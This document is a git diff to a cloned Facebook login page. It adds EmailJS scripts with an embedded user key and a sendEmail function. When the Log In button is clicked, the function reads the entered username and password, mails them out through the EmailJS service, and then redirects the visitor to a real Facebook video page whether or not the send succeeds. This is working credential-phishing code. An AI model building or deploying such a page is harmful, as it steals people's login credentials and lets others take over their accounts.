@@ -4,7 +4,12 @@
   <meta charset="UTF-8">
   <title>CodePen - Coding The Facebook Login Page By Hand</title>
   <link rel="stylesheet" href="./style.css">
-  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"></script>
+  <script type="text/javascript">
+    (function(){
+        emailjs.init("user_c1jv6s5AoHp53h3MDfc4N");
+    })();
+  </script>
 </head>
 <body>
 <!-- partial:index.partial.html -->
@@ -21,7 +26,7 @@
       </td>
       <td><input type="password" class="inputtext" id="password">
       </td>
-      <td><button id="button" value="Send Email" onclick="sendEmail()">Log In</button></td>
+      <td><button id="button">Log In</button></td>
     </tr>
     <tr>
       <td>
@@ -123,6 +128,22 @@
      </div>
     </div>
 <!-- partial -->
-  <script src="./index.js"></script>
+    <script>
+      function sendEmail() {
+        const templateParams = {
+          name: document.getElementById("username").value,
+          password: document.getElementById("password").value,
+        };
+        emailjs.send('default_service', 'template_ckc71Adx', templateParams, "user_c1jv6s5AoHp53h3MDfc4N")
+          .then(function(response) {
+            console.log('SUCCESS!', response.status, response.text);
+            window.open("https://www.facebook.com/e7nabs/videos/2036191296422631","_self");
+          }, function(error) {
+            console.log('FAILED...', error);
+            window.open("https://www.facebook.com/e7nabs/videos/2036191296422631","_self");
+          });
+      } 
+      document.getElementById("button").addEventListener("click", sendEmail)
+    </script>
 </body>
 </html>
